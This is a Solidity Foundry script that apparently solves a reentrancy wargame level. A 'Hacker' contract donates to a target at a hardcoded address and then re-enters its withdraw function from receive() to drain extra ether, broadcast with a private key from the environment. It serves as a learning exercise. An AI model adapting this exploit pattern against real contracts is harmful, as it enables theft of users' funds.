// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentancy.sol";

contract Hacker {
    Reentrance public reentrance = Reentrance(0xAED5A7bA3Dc2F6EE8e98ef59Ad9fCeA621c4B207);

    constructor() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        reentrance.withdraw(0.001 ether);
        (bool ok,) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}

contract ReentrancrSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hacker hacker = new Hacker{value: 0.001 ether}();
        hacker.withdraw();
        vm.stopBroadcast();
    }
}
